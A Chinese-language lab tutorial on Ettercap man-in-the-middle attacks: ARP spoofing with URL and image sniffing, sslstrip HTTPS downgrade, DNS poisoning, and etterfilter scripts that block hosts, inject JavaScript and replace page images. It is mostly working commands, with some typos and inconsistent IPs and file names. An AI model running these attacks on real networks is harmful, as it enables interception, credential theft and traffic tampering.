# Ettercap 实施中间人攻击



中间人攻击(MITM)该攻击很早就成为了黑客常用的一种古老的攻击手段,并且一直到如今还具有极大的扩展空间,MITM攻击的使用是很广泛的,曾经猖獗一时的SMB会话劫持、DNS欺骗等技术都是典型的MITM攻击手段.在黑客技术越来越多的运用于以获取经济利益为目标的情况下时,MITM攻击成为对网银、网游、网上交易等最有威胁并且最具破坏性的一种攻击方式.



| 主机列表   | IP地址         | 网关地址    | 主机作用 |
| :--------- | :------------- | :---------- | :------- |
| Windows 10 | 192.168.1.2/24 | 192.168.1.1 | 被害主机 |
| Kali Linux | 192.168.1.9/24 | 192.168.1.1 | 攻击主机 |



## 抓取内网流量

该方法是最常用的一种攻击方式,主要可以实现对内网主机发起ARP欺骗,从而截取内网主机的流量,但该方法只能截获未加密的数据流加密后是无法破解的,以下例子将演示流量抓取与分析.

**开启APR欺骗:** 首先在`kali linux`上执行以下命令,开启ARP欺骗.

```shell
root@kali:~# ettercap -i eth0 -T -M arp:remote /192.168.1.2// /192.168.1.1// -q

    -i eth0           #指定网卡接口
    -T                #文本模式显示
    -M                #指定为双向ARP欺骗
    /192.168.1.2//    #为要攻击的IP地址
    /192.168.1.1//    #本地的网关地址
```

**截取目标RUL:** 上面终端不要关闭,启用`urlsnarf`工具指定主机访问的URL.

```shell
root@kali:~# urlsnarf -i eth0 |awk '{print $1 " ---> " $7}'

192.168.1.2 ---> http://www.mkdirs.com
192.168.1.2 ---> http://www.baidu.com/
192.168.1.2 ---> http://www.cnblogs.com/lyshark
```

**截取目标图片:** 当然也可以使用`driftnet`工具截取指定主机的图片流.

```shell
root@kali:~# driftnet -i eth0
```



## HTTPS降级嗅探

对SSL流量的嗅探,可以使用sslstrip这个工具,它的原理就是把所有的https流量降级为http流量,相当于一个中间人的角色,它与服务器建立正常的https连接,而与浏览器则使用http连接,使用时需要本机开启流量转发,将80端口的http流量同时转发到10000端口上,在10000端口上使用sslstrip来监听即可:

1.通过命令收集局域网的IP地址信息,和网关等.

```shell
root@kali:~# ifcofing       #命令查看当前网关
root@kali:~# netdiscover    #获取到当前目标IP
```

2.开启内核转发功能保证攻击过程中被攻击者不断网.

```shell
root@kali:~# echo "1" > /proc/sys/net/ipv4/ip_forward
```

3.使用iptables把80端口的流量转发到sslstrip监听的10000端口上.

```shell
root@kali:~# iptalbes -t nat -F
root@kali:~# iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 10000
root@kali:~# iptables -t nat -A PREROUTING -p tcp -–destination-port 80 -j REDIRECT –to-ports 10000
root@kali:~# iptables -t nat -L
```

4.启用`sslstrip`并启动ettercap对目标主机进行arp攻击.

```shell
root@kali:~# sslstrip -l 10000
root@kali:~# ettercap -i eth0 -T -M arp:remote /192.168.1.2// /192.168.1.1//
```

此时当用户浏览的网页中包含https协议,会被转化为http协议的请求.但是sslstrip也不是万能的,假如网页中没有https,但是js代码绑定了跳转到https的协议请求的事件,那么sslstrip就失效了.如果用户打开网页的时候请求就是https,会导致证书认证失败,网页一直打不开.



## DNS局域网投毒

该配置主要用于实现控制局域网中网络的访问,例如可以指定将所有访问`baidu.com`的请求转到访问`192.168.1.9`这台主机上,我们可以在这台主机上配合后门,这样的话所有内网主机都会默认访问我们的网址,从而实现局域网中网站页面的重定向.

1.安装并启动apache服务程序,后期我们要将页面跳转到kali的http服务上.

```shell
root@kali:~# echo "hello lyshark" > /var/www/html/index.html
root@kali:~# systemctl restart apache2
```

2.通过使用`netdiscover命令`获取到主机信息,这里主要来确定一下`192.168.1.1是网关`,而`192.168.1.2`为被攻击主机.

```shell
root@kali:~# netdiscover

Currently scanning: 192.168.1.0/24   |   Screen View: Unique Hosts
 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.1.1     11:72:se:c7:se:af      1      60  TP-LINK TECHNOLOGIES
 192.168.1.2     ac:3s:ca:xf:g1:w8      1      60  Dell Inc.
 192.168.1.9     f2:1e:28:4e:4c:s4      1      60  kali linux.
```

3.配置跳转地址,将所有访问`.com,.org`的网页请求,全部跳转到本机的apache上.

```shell
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.8  netmask 255.255.255.0  broadcast 192.168.1.255    确认自身IP地址

root@kali:~# vim /etc/ettercap/etter.dns 
################################
# microsoft sucks ;)
# redirect it to www.linux.org
#

*.com A 192.168.1.9          #添加跳转页面,意思是只要是.com结尾的,跳转到本机IP
*.org A 192.168.1.9          #添加跳转页面,意思是只要是.com结尾的,跳转到本机IP

microsoft.com      A   107.170.40.56
*.microsoft.com    A   107.170.40.56
www.microsoft.com  PTR 107.170.40.56      # Wildcards in PTR are not allowed
```

4.开启转发,并启动中间人攻击,此时被攻击主机访问指定规则页面,都会跳转到我们的网站上.

```shell
root@kali:~# echo 1 > /proc/sys/net/ipv4/ip_forward
root@kali:~# ettercap -i eth0 -T -P dns_spoof -M arp /192.168.1.2// /192.168.1.1// -q
root@kali:~# ettercap -i eth0 -T -P dns_spoof -M arp /// /192.168.1.1// -q
```



## 禁止主机上网

1.编写一个过滤脚本,下面的脚本名为`lyshark.txt`,内容如下.

```shell
root@kali:~# vim lyshark.txt

if (ip.src == '默认网关') {
   kill();
   drop();
   msg("kill all");
}
if (ip.src == '被攻击主机IP') {
   kill();
   drop();
   msg("kill all");
}
```

2.编译成ettercap可以识别的二进制的二进制文件.

```shell
root@kali:~#  etterfilter lyshark.txt -o lyshark.ef
```

3.使用ettercap加载此脚本,欺骗全网段可以使用`///`代表.

```shell
ettercap -i eth0 -T -F lyshark.ef -M arp:remote /192.168.1.2// /192.168.1.1//  // 欺骗指定主机
ettercap -i eth0 -T -F lyshark.ef -M arp:remote /// /192.168.1.1//             // 欺骗全网段
```

## 向网页注入代码

该功能可以实现向网页中注入特定的代码.

1.编写一个过滤脚本,下面的脚本名为`lyshark.txt`,内容如下.

```shell
# 拦截受害者发送的请求，将报文压缩方式由gzip降级为不压缩
if (ip.proto == TCP && tcp.dst == 80) {
    if (search(DATA.data, "Accept-Encoding")) {
           pcre_regex(DATA.data,"(Accept-Encoding:).*([\r\n])","$1 identity$2");
           msg("chage encoding");
    }
}

# 对于服务器响应，向head中注入js
if (ip.proto == TCP && tcp.src == 80) {
    if (search(DATA.data, "<head>")) {
        replace("<head>","<head><script>alert('hello lyshark')</script>");
    }
}
```

需要注意,这里要对请求头的`Accept-Encoding进行篡改`,否则响应默认使用gzip编码的,这样我们直接注入明文js是无效的,将编码方式降级为Identity,服务端会返回明文报文,同时客户端也不会再对报文进行一次解码.

2.编译成ettercap可以识别的二进制的二进制文件.

```shell
root@kali:~#  etterfilter lyshark.txt -o lyshark.ef
```

3.使用ettercap加载此脚本,欺骗全网段可以使用`///`代表.

```
ettercap -i eth0 -T -F ig.ef -M ARP:remote -w network.pcap /192.168.1.2// /192.168.1.1//
```

## 替换页面数据

1.以下脚本可实现将页面中所有`img src=`相关的图片全部替换成,指定网址中的图片.

```shell
if (ip.proto == TCP && tcp.dst == 80) {
   if (search(DATA.data, "Accept-Encoding")) {
      replace("Accept-Encoding", "Accept-Rubbish!"); 
      msg("zapped Accept-Encoding!\n");
   }
}
if (ip.proto == TCP && tcp.src == 80) {
   replace("img src=", "img src=\"http://www.mkdirs.com/lyshark.jpg\" ");
   replace("IMG SRC=", "img src=\"http://www.mkdirs.com/lyshark.jpg\" ");
   msg("Filter Ran.\n");
}
```

2.编译这个文件.

```shell
etterfilter exe.filter -o exe.ef
```

3.使用ettercap调用过滤脚本发动ARP攻击毒化目标主机的ARP缓存

```shell
ettercap -Tq -i wlan0 -F exe.ef -M arp:remote /192.168.1.9/  /192.168.1.1/
```



文章作者：[lyshark](http://www.cnblogs.com/lyshark/)